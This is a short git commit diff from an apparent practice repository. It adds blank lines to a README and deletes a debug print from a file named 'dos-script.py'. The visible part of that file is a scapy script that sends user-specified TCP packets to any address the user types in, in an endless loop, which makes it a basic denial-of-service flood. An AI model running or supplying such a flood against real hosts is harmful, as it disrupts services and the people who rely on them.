dc9ec9292505dfe11d033c20db81aacaeea49d76
natatchikhinashvili <natanatuka33@gmail.com>
2023-12-11 19:05:21 +0400

    feat: sccripts

--- README.md
+++ README.md
@@ -1,2 +1,5 @@
 # pipeline-task
 
+
+
+
--- dos-script.py
+++ dos-script.py
@@ -2,7 +2,6 @@ from scapy.all import TCP, IP, sr1, conf
 
 dstaddress = input('Destination address: ')
 flag = input('Flag: ')
-print(conf.route.route)
 
 while True:
     p = sr1(IP(dst=dstaddress)/TCP(flags=flag))
